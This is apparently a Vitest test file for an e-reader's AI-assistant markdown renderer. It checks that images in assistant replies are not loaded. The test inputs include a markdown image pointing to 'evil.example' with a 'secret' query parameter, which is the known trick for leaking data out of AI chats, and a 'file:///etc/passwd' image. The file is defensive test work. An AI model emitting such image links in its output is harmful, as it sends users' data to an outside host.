import { describe, expect, it, vi } from 'vitest';
import { render } from '@testing-library/react';
import ReactMarkdown from 'react-markdown';

vi.mock('@/utils/open', () => ({ openExternalUrl: vi.fn() }));

import { createAssistantMarkdownComponents } from '@/app/reader/components/assistant/AssistantMarkdown';

function renderMarkdown(markdown: string) {
  const components = createAssistantMarkdownComponents({
    bookKey: 'book-1',
    citations: [],
    passageLabel: 'Passage',
  });
  return render(<ReactMarkdown components={components}>{markdown}</ReactMarkdown>);
}

describe('assistant markdown images', () => {
  it('renders a remote image as a link instead of loading it', () => {
    const { container } = renderMarkdown('![chart](https://evil.example/x.png?d=secret)');
    expect(container.querySelector('img')).toBeNull();
    const button = container.querySelector('button');
    expect(button?.textContent).toBe('chart');
  });

  it('renders a non-http image as plain alt text', () => {
    const { container } = renderMarkdown('![local](file:///etc/passwd)');
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('button')).toBeNull();
    expect(container.textContent).toBe('local');
  });
});
